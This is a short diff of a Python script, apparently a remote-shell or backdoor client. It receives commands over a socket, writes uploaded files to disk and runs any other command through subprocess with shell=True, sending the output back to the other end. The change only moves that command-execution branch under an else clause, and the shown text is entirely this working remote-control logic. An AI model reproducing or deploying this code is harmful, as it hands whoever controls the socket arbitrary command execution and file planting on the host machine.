@@ -25,7 +25,7 @@ try:
         command = client.recv(1024)
         command = command.decode()
 
-        if(command == 'file'):
+        if command == 'file':
             file_name = client.recv(1024).decode()
             f = None
             try:
@@ -33,12 +33,13 @@ try:
                 f.write(client.recv(1024).decode())
             finally:
                 f.close()
+        else:
+            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = op.stdout.read()
+            output_error = op.stderr.read()
+            print("[-] Sending response...")
+            client.send(output + output_error)
 
-        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        output = op.stdout.read()
-        output_error = op.stderr.read()
-        print("[-] Sending response...")
-        client.send(output + output_error)
 except ConnectionAbortedError:
     print("Connection severed")
 except ConnectionResetError:
